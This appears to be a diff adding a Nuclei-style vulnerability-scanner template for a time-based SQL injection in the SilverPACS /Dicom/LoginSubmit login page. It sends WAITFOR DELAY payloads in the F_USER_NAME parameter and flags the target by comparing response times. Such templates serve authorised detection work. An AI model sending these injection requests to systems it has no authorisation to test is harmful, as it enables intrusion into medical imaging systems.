@@ -1,0 +1,38 @@
+id: silverpacs-loginsubmit-sqli
+
+info:
+  name: silverpacs-loginsubmit-sqli
+  author: HB
+  severity: critical
+
+
+http:
+  - raw:
+    - |
+      GET /Dicom/LoginSubmit?F_USER_NAME=admin%27%3BWAITFOR+DELAY+%270%3A0%3A0%27--&F_PASSWORD=123 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=qsguojc523ccippulfisketg
+      Upgrade-Insecure-Requests: 1
+
+    - |
+      GET /Dicom/LoginSubmit?F_USER_NAME=admin%27%3BWAITFOR+DELAY+%270%3A0%3A1%27--&F_PASSWORD=123 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=qsguojc523ccippulfisketg
+      Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0 && duration_1<=1"
+          - "duration_2>=1"
